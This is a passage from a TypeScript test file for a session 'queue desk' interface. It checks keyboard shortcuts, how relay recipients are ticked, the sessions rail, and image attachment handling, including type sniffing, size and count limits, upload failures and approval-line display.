      assert.equal(collectText(desk.draw()).includes("Tick at least one session in the rail."), true);
    });
  }

  test("Cmd+Enter in the Orders box with a session ticked sends the order once", async () => {
    const desk = await ordersKeyDesk({ ids: [SESSION_ID], names: ["atrium"], endedCount: 0 });
    desk.pressSend(desk.inOrders("TEXTAREA"));
    assert.deepEqual([desk.sent, desk.composer.error], [[{ sessionIds: [SESSION_ID], text: "rebase on main" }], null]);
  });

  const named = [
    { name: "a report's Mark as read answers E and its Read later L", item: report, keys: { "Mark as read": "e", "Read later": "l" } },
    { name: "a decision's Answer later answers L", item: decision, keys: { "Answer later": "l" } },
  ];
  for (const row of named) {
    test(`the sheet's buttons: ${row.name}`, () => {
      const tree = renderSheet({ item: row.item, queue: buildQueue().queue });
      for (const [label, key] of Object.entries(row.keys)) assert.equal(buttonLabelled(tree, label)[0]?.props["data-key"], key, label);
    });
  }

  // spec §9.2 → Reaching it: N and O put the caret in the Orders box from the list and from a sheet; there is no mode
  const carets = [
    { name: "N from the list keeps the ticks", selected: 0 },
    { name: "N from a sheet keeps the ticks", selected: 3 },
  ];
  for (const row of carets) test(`a key's act: ${row.name}`, () => assert.deepEqual(press("new", row.selected).calls, [["focusOrders"]]));

  const ticks = [
    { name: "O on a decision adds its session to the ticks, then the caret to Orders", selected: 3, target: desk, ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on an open report adds its session, with no Re: line", selected: 5, target: desk, ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on a rail row adds that row's session", selected: 3, target: buildKeyTarget({ session: ENDED_ID }), ticked: [], expected: [ENDED_ID] },
    { name: "O on a focused list row adds that row's session", selected: 0, target: rowTarget(5), ticked: [OTHER_TICK_ID], expected: [OTHER_TICK_ID, SESSION_ID] },
    { name: "O on a session already ticked keeps the ticks as they are", selected: 3, target: desk, ticked: [SESSION_ID], expected: [SESSION_ID] },
    { name: "O on a session that takes no message ticks nothing", selected: 3, target: buildKeyTarget({ session: REPLACED_ID }), ticked: [], expected: [] },
  ];
  for (const row of ticks) {
    test(`a key's act: ${row.name}`, () => {
      let ticked = row.ticked;
      const setSelectedIds = (update: (ids: string[]) => string[]) => { ticked = update(ticked); };
      const { calls } = press("order", row.selected, { target: row.target, sessions: { selectedIds: row.ticked, setSelectedIds } });
      assert.deepEqual([getPlain(ticked), calls], [row.expected, [["focusOrders"]]]);
    });
  }

  // spec §9.9 Part 2: O on a relay ticks each recipient that takes orders and never its sender; none taking orders → said in the Orders note
  const RELAY_SENDER_ID = "9d2f4c10-6a1e-4b2d-8c3f-1e7a5b9d0c22";
  const relayRails = [...SESSION_ROWS, buildSessionRow({ id: OTHER_TICK_ID, name: "sixmon" }), buildSessionRow({ id: RELAY_SENDER_ID, name: "gersona" })];
  const relayTo = (firstId: number, sessionIds: string[], sendId: string) => sessionIds.map((sessionId, index) => buildItem({
    id: firstId + index, kind: "relay", status: "answered", options: [], sendId, session: buildSession({ id: sessionId }),
    relay: { hop: 0, parent: null, sender: { sessionIdPrefix: RELAY_SENDER_ID.slice(0, 8), profileLabel: "work", selfDeclaredName: "gersona", cwdTail: "git/gersona" }, fetchedAt: null, redaction: null, lapsedAt: null },
  }));
  const pressOnRelay = (selected: number, ticked: string[], target: unknown = desk) => {
    let ticks = ticked;
    const notes: unknown[] = [];
    const built = buildQueue({
      sessions: buildSessions({ region: { status: "ready", data: { sessions: relayRails, hasMore: false }, error: null, busy: false }, selectedIds: ticked, setSelectedIds: (update: (ids: string[]) => string[]) => { ticks = update(ticks); } }),
      orders: buildOrders({ focus: () => built.calls.push(["focusOrders"]), setNote: (note: unknown) => notes.push(note) }),
    });
    const listed = withList(built.queue, [...relayTo(412, [SESSION_ID, OTHER_TICK_ID], "send-a"), ...relayTo(420, [REPLACED_ID], "send-b")]);
    (screen.putDeskKeyQ as (a: unknown, c: unknown) => void)({ name: "order" }, { queue: { ...listed, sheet: getSheet(listed.groups, selected ? String(selected) : "") }, target, root: keyRoot });
    return { ticks: getPlain(ticks), notes: getPlain(notes), calls: getPlain(built.calls) };
  };
  const relayOrders = [
    { name: "O on a relay's sheet ticks each recipient that takes orders, never the sender", selected: 412, ticked: [], expected: { ticks: [SESSION_ID, OTHER_TICK_ID], notes: [] } },
    { name: "O on a relay's focused row ticks each recipient that takes orders", selected: 0, target: rowTarget(412), ticked: [], expected: { ticks: [SESSION_ID, OTHER_TICK_ID], notes: [] } },
    { name: "O on a relay leaves a recipient already ticked as it is", selected: 412, ticked: [OTHER_TICK_ID], expected: { ticks: [OTHER_TICK_ID, SESSION_ID], notes: [] } },
    { name: "O on a relay no recipient of which takes orders changes no tick and says so", selected: 420, ticked: [], expected: { ticks: [], notes: ["No recipient of this relay takes orders now."] } },
  ];
  for (const row of relayOrders) {
    test(`a key's act: ${row.name}`, () => {
      const { ticks, notes, calls } = pressOnRelay(row.selected, row.ticked, row.target);
      assert.deepEqual({ ticks, notes, calls }, { ...row.expected, calls: [["focusOrders"]] });
    });
  }

  test("the Orders note says no recipient of the relay takes orders, until the box or the ticks next change", async () => {
    const stateful = createStatefulReact();
    const module = (await loadScreenModule(QUEUE_SRC, {
      React: stateful.react, URLSearchParams, window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
      fetch: async () => ({ status: 200, json: async () => ({ items: [], nextCursor: null }) }),
    })) as ScreenModule;
    const useOrders = module.useOrdersQ as (deps: unknown) => { note: string | null; setNote: (note: string) => void; setText: (text: string) => void };
    const run = (selectedIds: string[]) => {
      stateful.resetCursor();
      const orders = useOrders({ selectedIds, sendAction: () => undefined, setStatus: () => undefined, reload: () => undefined });
      stateful.flushEffects();
      return orders;
    };
    run([SESSION_ID]).setNote("No recipient of this relay takes orders now.");
    const kept = run([SESSION_ID]).note;
    run([SESSION_ID, OTHER_TICK_ID]);
    const afterTicks = run([SESSION_ID, OTHER_TICK_ID]);
    afterTicks.setNote("No recipient of this relay takes orders now.");
    run([SESSION_ID, OTHER_TICK_ID]).setText("rebase");
    assert.deepEqual([kept, afterTicks.note, run([SESSION_ID, OTHER_TICK_ID]).note], ["No recipient of this relay takes orders now.", null, null]);
  });

  test("the Orders note slot shows the relay's no-recipient line after the info glyph", () => {
    const tree = renderOrders({ note: "No recipient of this relay takes orders now." });
    const [line] = findNodes(tree, (node) => node.type === "p" && collectText(node).includes("No recipient"));
    assert.equal(collectText(line as RenderedNode).replace(/\s+/g, " ").trim(), "ℹ No recipient of this relay takes orders now.");
  });

  test("a key pressed on the desk reaches the queue: N puts the caret in Orders", () => {
    const { calls, queue } = deskWith(3);
    const tree = render("QueueDeskQ", { queue: { ...queue, orders: buildOrders({ focus: () => calls.push(["focusOrders"]) }), keys: { isOn: true } } });
    const [root] = findNodes(tree, (node) => typeof node.props?.className === "string" && node.props.className.startsWith("queue-desk"));
    (root?.props.onKeyDown as (e: unknown) => void)({ key: "n", metaKey: false, ctrlKey: false, altKey: false, defaultPrevented: false, target: desk, preventDefault: () => undefined });
    assert.deepEqual(getPlain(calls), [["focusOrders"]]);
  });

  // spec §9.2 → Esc in the pane gives the focus back to the middle pane: the sheet's body, or the list's current row
  const leaves = [
    { name: "with a sheet open, to its body", selected: 5, elements: { ".queue-sheet > .card-body": "sheet body", "#queue-row-5": "row 5" }, expected: ["focus sheet body"] },
    { name: "on the list, to the current row", selected: 0, current: 3, elements: { "#queue-row-3": "row 3" }, expected: ["focus row 3"] },
    { name: "on the list with no current row, to its tab stop", selected: 0, elements: { '.queue-listbox [tabindex="0"]': "first row" }, expected: ["focus first row"] },
  ];
  for (const row of leaves) {
    test(`Esc in Orders gives the focus back to the middle pane: ${row.name}`, () => {
      keyActs.length = 0;
      keyRoot.elements = Object.fromEntries(Object.entries(row.elements).map(([selector, name]) => [selector, keyElement(name)]));
      const { queue } = deskWith(row.selected);
      (screen.putDeskKeyQ as (a: unknown, c: unknown) => void)({ name: "leave" }, { queue: { ...queue, selectedId: row.selected || (row.current ?? null) }, target: desk, root: keyRoot });
      assert.deepEqual([...keyActs], row.expected);
    });
  }

  // the list card's ⓘ holds the key list and the switch
  const renderKeyList = (isOn: boolean, toggle: () => unknown = () => undefined) => {
    const { queue } = buildQueue({ keys: { isOn, toggle } });
    const tree = render("QueueListQ", { queue: withList(queue, [decision]) });
    const [card] = findNodes(tree, (node) => node.props?.atom === "Card");
    return { card, info: renderScreen(card?.props.info) as RenderedNode };
  };

  test("the list head's ⓘ is named for the keys and lists every desk letter", () => {
    const { card, info } = renderKeyList(true);
    const listed = findNodes(info, (node) => node.type === "dt").map((node) => collectText(node).trim());
    const letters = Object.keys(getPlain(vm.runInContext("DESK_LETTERS_Q", screen as unknown as vm.Context) as Record<string, string>));
    assert.deepEqual([card?.props.infoLabel, card?.props.infoTitle], ["Keyboard shortcuts", "Keyboard shortcuts"]);
    for (const letter of letters) assert.ok(listed.some((label) => label.split(/[ /]+/).includes(letter.toUpperCase())), `key ${letter.toUpperCase()} is listed`);
    for (const chord of ["Enter", "Esc", "1 – 9", "Cmd / Ctrl + Enter", "↓ / ↑", "Home / End"]) assert.ok(listed.includes(chord), `${chord} is listed`);
  });

  const states = [
    { name: "on shows the switch ticked", isOn: true },
    { name: "off shows it unticked", isOn: false },
  ];
  for (const row of states) {
    test(`the single-key switch in the key list: ${row.name}, and a press flips it`, () => {
      const flips: string[] = [];
      const { info } = renderKeyList(row.isOn, () => flips.push("toggle"));
      const [box] = findNodes(info, (node) => node.type === "input" && node.props.type === "checkbox");
      assert.equal(box?.props.checked, row.isOn);
      assert.match(collectText(info), /Single-key shortcuts/);
      (box?.props.onChange as () => void)();
      assert.deepEqual(flips, ["toggle"]);
    });
  }

  const switches = [
    { name: "nothing stored → on", stored: null, expected: true },
    { name: "stored off → off", stored: "false", expected: false },
    { name: "stored on → on", stored: "true", expected: true },
    { name: "an unreadable store → on", stored: "{", expected: true },
  ];
  for (const row of switches) {
    test(`the single-key switch: ${row.name}`, () => {
      const storage = { getItem: (key: string) => (key === "queue.keys" ? row.stored : null) };
      assert.equal(call("getKeysOnQ", storage), row.expected);
    });
  }
});

describe("sessions region", () => {
  test("the list read follows the Account filter, drops ticks on rows no longer listed or selectable, and says the dropped one", async () => {
    const urls: string[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      URLSearchParams,
      window: { UI: realUi },
      fetch: async (url: string) => {
        urls.push(url);
        return { status: 200, json: async () => ({ sessions: SESSION_ROWS, hasMore: false }) };
      },
    })) as ScreenModule;
    let region: unknown = realUi.INITIAL_REGION_STATE;
    let selectedIds = ["9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", SESSION_ID, REPLACED_ID];
    const lines: string[] = [];
    await (module.getSessionsQ as (deps: unknown) => Promise<void>)({
      profile: "work dev",
      setRegion: (next: (prev: unknown) => unknown) => { region = next(region); },
      getIds: () => selectedIds,
      setSelectedIds: (next: (prev: string[]) => string[]) => { selectedIds = next(selectedIds); },
      onDropped: (line: string) => lines.push(line),
    });
    assert.deepEqual(urls, ["/api/queue/owner/sessions?profile=work+dev"]);
    assert.equal((getPlain(region) as { data: { sessions: unknown[] } }).data.sessions.length, 3);
    assert.deepEqual(getPlain(selectedIds), [SESSION_ID]);
    assert.deepEqual(lines, ["⚠ nightly-docs-sweep no longer takes orders and was unticked."]);
  });

  const views = [
    { name: "a failed read shows the shared region failure with Retry", region: { status: "error", data: null, error: "HTTP 503 database_unavailable", busy: false }, atom: "RegionUnavailable" },
    { name: "no session at all shows the empty state", region: { status: "ready", data: { sessions: [], hasMore: false }, error: null, busy: false }, atom: "EmptyState" },
    { name: "a loaded list shows the session rows", region: buildSessions().region, atom: "row" },
  ];
  for (const view of views) {
    test(view.name, () => {
      const { tree } = renderRail({ region: view.region });
      assert.equal(findNodes(tree, (node) => node.props?.atom === view.atom || (view.atom === "row" && node.props?.["data-session"] === SESSION_ID)).length, 1);
    });
  }

  test("the desk reads Sessions, then the middle pane, then Orders, and the recent resumes open from the Sessions foot", () => {
    const tree = render("QueueDeskQ", { queue: withList(buildQueue().queue, [buildItem({ id: 1 })]) });
    const order = findNodes(tree, (node) => ["SessionsRegionQ", "RecentResumesQ", "QueueListQ", "QueueSheetQ", "OrdersViewQ"].includes(node.type)).map((node) => node.type);
    assert.deepEqual(order, ["SessionsRegionQ", "QueueListQ", "QueueSheetQ", "OrdersViewQ"]);
  });

  test("an empty rail says a session joins it at its first prompt", () => {
    const { tree } = renderRail({ region: { status: "ready", data: { sessions: [], hasMore: false }, error: null, busy: false } });
    const [empty] = findNodes(tree, (node) => node.props?.atom === "EmptyState");
    assert.deepEqual({ message: empty?.props.message, hint: empty?.props.hint }, { message: "No connected sessions", hint: "A session appears here once it has received its first prompt." });
  });

  test("the Sessions head holds no New order", () => assert.equal(buttonLabelled(renderRail().tree, "New order").length, 0));
});

test("a row's age carries no verb", () => {
  const rows = call<Array<{ rows: unknown[] }>>("getGroupsQ", [buildItem({ id: 1 }), buildItem({ id: 2, kind: "message", status: "delivered", sendId: "s" })]).flatMap((group) => group.rows);
  for (const row of rows) {
    const text = collectText(render("QueueRowQ", { row, isSelected: false, cols: ["tag", "fact"], view: { isNameShown: true, isAccountShown: false }, onSelect: () => undefined }));
    assert.doesNotMatch(text, /\b(asked|sent)\b/, text);
  }
});

// Real 3 × 2 files, the same bytes the upload route's own tests store; WebP is a real 1 × 1 lossless file
const SAMPLE_IMAGE = {
  png: Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAMAAAACCAIAAAASFvFNAAAAEElEQVR4nGP4z8AAQQxwFgBB0gX7h/C5SAAAAABJRU5ErkJggg==", "base64"),
  gif: Buffer.from("R0lGODdhAwACAJEAAAAAAP8AAP///wAAACH5BAQAAAAALAAAAAADAAIAAAICjF8AOw==", "base64"),
  webp: Buffer.from("UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==", "base64"),
  jpeg: Buffer.from("/9j/4AAQSkZJRgABAQAASABIAAD/wAARCAACAAMDASIAAhEBAxEB/9oADAMBAAIRAxEAPwD4vooor+Uz/fw//9k=", "base64"),
} as const;
const IMAGE_ID = ["0b6f3c1e-7a2d-4e8b-9c5f-1d2e3f4a5b6c", "1c7a4d2f-8b3e-4f9c-8d6a-2e3f4a5b6c7d", "2d8b5e3a-9c4f-4a0d-9e7b-3f4a5b6c7d8e"];
const shot = (index: number, fields: Record<string, unknown> = {}) => ({ key: `s${index}`, name: `shot-${index + 1}.png`, bytes: 1258291, status: "stored", id: IMAGE_ID[index], src: `/api/queue/owner/images/${IMAGE_ID[index]}`, ...fields });

describe("images in a composer", () => {
  const IMAGES = vm.runInContext("IMAGES_Q", screen) as { MAX: number; BYTES_MAX: number; NAME_MAX: number };

  // the page checks a file before it uploads it → it may refuse less than the server, never more
  const sniffs = [
    ...Object.entries(SAMPLE_IMAGE).map(([type, bytes]) => ({ name: `a real ${type}`, bytes })),
    { name: "a PDF renamed .png", bytes: Buffer.from("%PDF-1.7\n1 0 obj << >> endobj\n") },
    { name: "an SVG", bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"></svg>') },
    { name: "an empty file", bytes: Buffer.alloc(0) },
  ];
  for (const row of sniffs) {
    test(`the page reads the type from the bytes as the server does: ${row.name}`, () => {
      assert.equal(call("getImageTypeQ", new Uint8Array(row.bytes)), getImageFacts(row.bytes)?.type ?? null);
    });
  }

  test("the page's limits are the server's: 8 ids pass a reply and 9 do not, 10 MB is the upload cap, a long or two-line name still passes", () => {
    const ids = (count: number) => Array.from({ length: count }, () => randomUUID());
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX) }).success, true);
    assert.equal(replyBodySchema.safeParse({ text: "see the shots", attachmentIds: ids(IMAGES.MAX + 1) }).success, false);
    assert.equal(IMAGES.BYTES_MAX, IMAGE_BYTES_MAX);
    for (const name of [`${"화면".repeat(200)}.png`, "line one\nline two.png", "\t"]) {
      assert.equal(imageUploadQuerySchema.safeParse({ name: call("getUploadNameQ", name) }).success, true, JSON.stringify(name));
    }
  });

  const file = (name: string, type: string | null, bytes = 1258291) => ({ name, type, bytes });
  // spec §9.8 → Limits: the files that pass are still added; one line says what was not
  const plans = [
    { name: "three images to an empty box are all added", count: 0, files: [file("a.png", "png"), file("b.jpg", "jpeg"), file("c.webp", "webp")], added: ["a.png", "b.jpg", "c.webp"], line: null },
    { name: "past eight the rest are counted", count: 6, files: [file("a.png", "png"), file("b.png", "png"), file("c.png", "png"), file("d.png", "png")], added: ["a.png", "b.png"], line: "Up to 8 images per order: 2 were not added." },
    { name: "a PDF is named", count: 0, files: [file("plan.pdf", null), file("a.png", "png")], added: ["a.png"], line: "plan.pdf was not added: only PNG, JPEG, WebP or GIF images." },
    { name: "a file over 10 MB is named", count: 0, files: [file("shot-12.png", "png", 10 * 1024 * 1024 + 1)], added: [], line: "shot-12.png was not added: over 10 MB." },
    { name: "exactly 10 MB passes", count: 0, files: [file("big.png", "png", 10 * 1024 * 1024)], added: ["big.png"], line: null },
    { name: "several refused at once are counted", count: 0, files: [file("plan.pdf", null), file("logo.svg", null), file("huge.png", "png", 11 * 1024 * 1024)], added: [], line: "3 files were not added. Only PNG, JPEG, WebP or GIF, 10 MB each." },
    { name: "a refused type and the cap together are counted", count: 7, files: [file("plan.pdf", null), file("a.png", "png"), file("b.png", "png")], added: ["a.png"], line: "2 files were not added. Only PNG, JPEG, WebP or GIF, 10 MB each, 8 per order." },
    { name: "past eight on an answer the line names the answer", count: 7, noun: "answer", files: [file("a.png", "png"), file("b.png", "png"), file("c.png", "png")], added: ["a.png"], line: "Up to 8 images per answer: 2 were not added." },
    { name: "a refused type and the cap together on an answer name the answer", count: 7, noun: "answer", files: [file("plan.pdf", null), file("a.png", "png"), file("b.png", "png")], added: ["a.png"], line: "2 files were not added. Only PNG, JPEG, WebP or GIF, 10 MB each, 8 per answer." },
  ];
  for (const row of plans) {
    test(`adding files: ${row.name}`, () => {
      const plan = call<{ added: Array<{ name: string }>; refusal: string | null }>("getAddPlanQ", row.count, row.files, row.noun ?? "order");
      assert.deepEqual([plan.added.map((one) => one.name), plan.refusal], [row.added, row.line]);
    });
  }

  const counts = [
    { name: "three images in MB", shots: [shot(0), shot(1), shot(2, { bytes: 1258292 })], line: "3 images · 3.6 MB" },
    { name: "one small image in KB", shots: [shot(0, { bytes: 300 * 1024 })], line: "1 image · 300 KB" },
  ];
  for (const row of counts) test(`the count after the thumbnails: ${row.name}`, () => assert.equal(call("getImageCountLineQ", row.shots), row.line));

  // spec §9.8 / §10: what the note slot says about the images, when nothing else is said there
  const notes = [
    { name: "a file hangs over the box", shots: [shot(0)], isOver: true, note: { tone: "info", text: "Drop to add images.", retryKey: null } },
    { name: "a failed upload names the file and its cause, with Try again", shots: [shot(0), shot(2, { status: "failed", id: undefined, cause: "the monitor did not answer" })], isOver: false, note: { tone: "crit", text: "shot-3.png could not be uploaded: the monitor did not answer.", retryKey: "s2" } },
    { name: "uploads still running are counted", shots: [shot(0, { status: "uploading" }), shot(1, { status: "uploading" }), shot(2)], isOver: false, note: { tone: "info", text: "Uploading 2 images…", retryKey: null } },
    { name: "every image stored says nothing", shots: [shot(0)], isOver: false, note: null },
  ];
  for (const row of notes) test(`the image note: ${row.name}`, () => assert.deepEqual(call("getImageNoteQ", row.shots, row.isOver), row.note));

  const upload = async (status: number, answer: unknown) => {
    const requests: Array<{ url: string; method: string; type: string; body: unknown }> = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      URL: { createObjectURL: () => "blob:queue/1", revokeObjectURL: () => undefined },
      fetch: async (url: string, init: { method: string; headers: Record<string, string>; body: unknown }) => {
        requests.push({ url, method: init.method, type: init.headers["Content-Type"], body: init.body });
        return { status, json: async () => answer };
      },
    })) as ScreenModule;
    const png = new File([SAMPLE_IMAGE.png], "shot 1.png", { type: "image/heic" });
    let shots: unknown[] = [];
    const errors: unknown[] = [];
    await (module.putFilesQ as (deps: unknown) => Promise<void>)({
      files: [png], shots: [], setShots: (next: (prev: unknown[]) => unknown[]) => { shots = next(shots); }, putError: (error: unknown) => errors.push(error),
    });
    return { requests, shots: getPlain(shots) as Array<Record<string, unknown>>, errors, png };
  };

  test("an added image is uploaded as raw bytes under a fixed type with its name as a label, and its thumbnail then shows the stored copy", async () => {
    const result = await upload(201, { id: IMAGE_ID[0], name: "shot 1.png", type: "png", bytes: 76, width: 3, height: 2 });
    assert.deepEqual(result.requests.map(({ url, method, type }) => [url, method, type]), [["/api/queue/owner/images?name=shot%201.png", "POST", "application/octet-stream"]]);
    assert.equal(result.requests[0]?.body, result.png);
    assert.deepEqual(result.shots.map(({ name, status, id, src }) => ({ name, status, id, src })), [{ name: "shot 1.png", status: "stored", id: IMAGE_ID[0], src: `/api/queue/owner/images/${IMAGE_ID[0]}` }]);
    assert.deepEqual(result.errors, [null]);
  });

  // spec §4.5: a reload loses no draft → an image added after one never takes a restored image's key
  test("an image added after a reload stays apart from the restored ones: both thumbnails and both ids are kept", async () => {
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      URL: { createObjectURL: () => "blob:queue/1", revokeObjectURL: () => undefined },
      fetch: async () => ({ status: 201, json: async () => ({ id: IMAGE_ID[1], name: "after reload.png", type: "png", bytes: 76, width: 3, height: 2 }) }),
    })) as ScreenModule;
    let shots: Array<Record<string, unknown>> = [shot(0, { key: "shot-1" })];
    await (module.putFilesQ as (deps: unknown) => Promise<void>)({
      files: [new File([SAMPLE_IMAGE.png], "after reload.png", { type: "image/png" })], shots, putError: () => undefined,
      setShots: (next: (prev: unknown[]) => Array<Record<string, unknown>>) => { shots = next(shots); },
    });
    const ids = await (module.getStoredIdsQ as (shots: unknown[]) => Promise<string[] | null>)(shots);
    assert.equal(new Set(shots.map((one) => one.key)).size, 2, JSON.stringify(getPlain(shots)));
    assert.deepEqual([getPlain(shots).map((one) => [one.name, one.id]), getPlain(ids)], [[["shot-1.png", IMAGE_ID[0]], ["after reload.png", IMAGE_ID[1]]], [IMAGE_ID[0], IMAGE_ID[1]]]);
  });

  test("a refused upload keeps the thumbnail as failed with the server's cause", async () => {
    const result = await upload(415, { error: "unsupported_image", reason: "only PNG, JPEG, WebP or GIF images are taken" });
    assert.deepEqual(result.shots.map(({ status, cause }) => ({ status, cause })), [{ status: "failed", cause: "only PNG, JPEG, WebP or GIF images are taken" }]);
  });

  const report = (draft: Record<string, unknown>) => {
    const { calls, queue } = buildQueue();
    return { calls, tree: render("SheetFootQ", { item: buildItem({ kind: "report" }), draft, queue, isBusy: false, error: null }) };
  };

  test("a report's box shows each image with its remove button and the count, and takes more by its Add images button", () => {
    const { tree } = report({ text: "", images: [shot(0), shot(1)] });
    assert.deepEqual(findNodes(tree, (node) => node.type === "img").map((node) => [node.props.alt, node.props.src]), [["shot-1.png", shot(0).src], ["shot-2.png", shot(1).src]]);
    assert.deepEqual(findNodes(tree, (node) => /^Remove /.test(String(node.props?.["aria-label"]))).map((node) => node.props["aria-label"]), ["Remove shot-1.png", "Remove shot-2.png"]);
    assert.ok(collectText(tree).includes("2 images · 2.4 MB"), collectText(tree));
    assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, 1);
    const [input] = findNodes(tree, (node) => node.type === "input" && node.props.type === "file");
    assert.deepEqual([input?.props.accept, input?.props.multiple], ["image/png,image/jpeg,image/webp,image/gif", true]);
  });

  // spec §6 → Foot, §9.8 → On an answer: images go only where the session asked for words, an approval-class decision included
  const decisionBoxes = [
    { name: "a decision with a box", item: buildItem(), count: 1 },
    { name: "an approval-class decision with a box", item: buildItem({ isApprovalClass: true }), count: 1 },
    { name: "a decision that takes no words", item: buildItem({ isFreeTextAllowed: false }), count: 0 },
  ];
  for (const row of decisionBoxes) {
    test(`Add images on ${row.name}: ${row.count}`, () => {
      const tree = render("SheetFootQ", { item: row.item, draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
      assert.equal(findNodes(tree, (node) => node.props?.["aria-label"] === "Add images").length, row.count);
    });
  }

  const decision = (item: Record<string, unknown>, draft: Record<string, unknown>) => {
    const { calls, queue } = buildQueue();
    const tree = render("SheetFootQ", { item: buildItem(item), draft, queue, isBusy: false, error: null });
    const lines = (name: string) => byClass(tree, name).map((node) => collectText(node).replace(/\s+/g, " ").trim());
    return { calls, tree, lines };
  };

  // spec §9.8 → On an answer: the option or the text is what the session acts on; the images ride with it
  const answerRows = [
    { name: "a picked option with stored images sends their ids beside the code", draft: { code: "R1", images: [shot(1), shot(0)] }, calls: [["answerItem", 41, { code: "R1", attachmentIds: [IMAGE_ID[1], IMAGE_ID[0]] }]] },
    { name: "images with neither an option nor a text ask for the answer", draft: { images: [shot(0)] }, calls: [["setDraft", 41, { error: "Pick an option or write an answer, then send." }]] },
  ];
  for (const row of answerRows) {
    test(`a decision with images: ${row.name}`, () => {
      const { calls, tree } = decision({}, row.draft);
      (buttonLabelled(tree, "Send answer")[0]?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  test("a decision's image refusal goes to its tray line's field and counts per answer, the note slot's field untouched", async () => {
    const { calls, queue } = buildQueue({ setImages: () => undefined });
    const full = Array.from({ length: 8 }, (_, index) => shot(0, { key: `s${index}` }));
    const tree = render("SheetFootQ", { item: buildItem(), draft: { images: full }, queue, isBusy: false, error: null });
    const [input] = findNodes(tree, (node) => node.type === "input" && node.props.type === "file");
    const pngs = [new File([SAMPLE_IMAGE.png], "a.png", { type: "image/png" })];
    (input?.props.onChange as (event: unknown) => void)({ target: { files: pngs, value: "" } });
    await new Promise((resolve) => setTimeout(resolve, 20));
    assert.deepEqual(getPlain(calls).filter(([name]) => name === "setDraft"), [["setDraft", 41, { imageError: "Up to 8 images per answer: 1 was not added." }]]);
  });

  // C-approval-line: no image, upload or refusal line ever takes the approval line's place
  const approvalRows = [
    { name: "an upload in flight and a missing answer", draft: { images: [shot(0, { status: "uploading" })], error: "Pick an option or write an answer, then send." }, tray: "Uploading 1 image…", note: "✕ Pick an option or write an answer, then send." },
    { name: "an image refused at the door", draft: { imageError: "plan.pdf was not added: only PNG, JPEG, WebP or GIF images." }, tray: "✕ plan.pdf was not added: only PNG, JPEG, WebP or GIF images.", note: "No option picked. Goes to glass-atrium." },
    { name: "a stored image at rest", draft: { code: "R1", images: [shot(0)] }, tray: "Reference only — not part of the approval.", note: "R1 picked. Goes to glass-atrium." },
  ];
  for (const row of approvalRows) {
    test(`an approval-class decision with ${row.name} shows the approval line, the tray line and the note line apart`, () => {
      const { lines } = decision({ isApprovalClass: true }, row.draft);
      assert.deepEqual([lines("queue-approval-line").length, lines("queue-tray-line"), lines("queue-note-text")], [1, [row.tray], [row.note]]);
    });
  }

  test("a plain decision's tray line stays empty with a stored image: the reference line is the approval's alone", () => {
    const { lines } = decision({}, { code: "R1", images: [shot(0)] });
    assert.deepEqual(lines("queue-tray-line"), [""]);
  });

  // spec §8: an image counts as content for the ink and for Mark as read; an order is text, so images alone are refused
  const reportRows = [
    { name: "images alone put the ink on Send order", draft: { images: [shot(0)] }, press: null, ink: "Send order", calls: [] },
    { name: "Mark as read with an image in the box says the order is unsent", draft: { images: [shot(0)] }, press: "Mark as read", ink: "Send order", calls: [["setDraft", 41, { error: "Unsent order in the field. Send it, or clear it first." }]] },
    { name: "Send order with images and no text asks for the order", draft: { images: [shot(0)] }, press: "Send order", ink: "Send order", calls: [["setDraft", 41, { error: "Write the order, then send." }]] },
    { name: "Send order with text and stored images sends their ids in order", draft: { text: "see the red box", images: [shot(1), shot(0)] }, press: "Send order", ink: "Send order", calls: [["settle", 41, "reply", { text: "see the red box", attachmentIds: [IMAGE_ID[1], IMAGE_ID[0]] }]] },
  ];
  for (const row of reportRows) {
    test(`a report with images: ${row.name}`, () => {
      const { calls, tree } = report(row.draft);
      const buttons = findNodes(tree, (node) => node.type === "button" && /\bbtn lg\b/.test(String(node.props.className)));
      assert.deepEqual(buttons.filter((node) => /\bprimary\b/.test(String(node.props.className))).map((node) => collectText(node)), [row.ink]);
      if (row.press) (buttonLabelled(tree, row.press)[0]?.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), row.calls);
    });
  }

  test("an order send with stored images posts their ids beside the text", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [shot(0)] };
    await (module.sendMessageQ as (deps: unknown) => Promise<boolean>)({
      body: { sessionIds: [SESSION_ID], text: "rebase on main" }, names: ["gersona"], shots: [shot(0)],
      setComposer: (next: (prev: Record<string, unknown>) => Record<string, unknown>) => { composer = next(composer); }, setStatus: () => undefined, onSent: () => undefined,
    });
    assert.deepEqual(getPlain(posts), [{ sessionIds: [SESSION_ID], text: "rebase on main", attachmentIds: [IMAGE_ID[0]] }]);
    assert.deepEqual(getPlain(composer), { text: "", isBusy: false, error: null });
  });

  test("an order send with an image that failed to upload posts nothing and keeps the box", async () => {
    const posts: unknown[] = [];
    const module = (await loadScreenModule(QUEUE_SRC, {
      window: { UI: uiStub() },
      fetch: async (_url: string, init: { body: string }) => { posts.push(JSON.parse(init.body)); return { status: 201, json: async () => ({ items: [] }) }; },
    })) as ScreenModule;
    const failed = shot(0, { status: "failed", id: undefined, cause: "the monitor did not answer" });
    let composer: Record<string, unknown> = { text: "rebase on main", isBusy: false, error: null, images: [failed] };
